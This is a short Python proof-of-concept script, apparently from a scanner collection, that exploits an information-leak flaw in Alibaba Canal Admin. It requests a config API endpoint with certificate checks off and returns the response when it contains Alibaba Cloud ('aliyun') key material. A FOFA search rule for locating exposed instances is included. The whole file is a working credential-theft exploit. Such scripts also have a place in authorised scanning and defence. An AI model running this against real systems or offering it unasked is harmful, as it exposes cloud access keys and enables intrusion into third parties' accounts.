#!/usr/bin/env python3
# _*_ coding:utf-8 _*_


import requests
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME = 'Alibaba_Canal_Info_Leak'
AUTHOR = "JDQ"
REMARK = 'Alibaba Canal config 云密钥信息泄露漏洞'
FOFA_RULE = 'title="Canal Admin"'
######################################################


def poc(target):
    headers={
        "User-Agent":ua
    }
    try:
        r = requests.get(target+"/api/v1/canal/config/1/0",headers=headers, verify=False)
        if r.status_code == 200 and 'aliyun' in r.text:        
            return(r.text)
    except :
        pass



if __name__ == '__main__':
    poc("127.0.0.1")
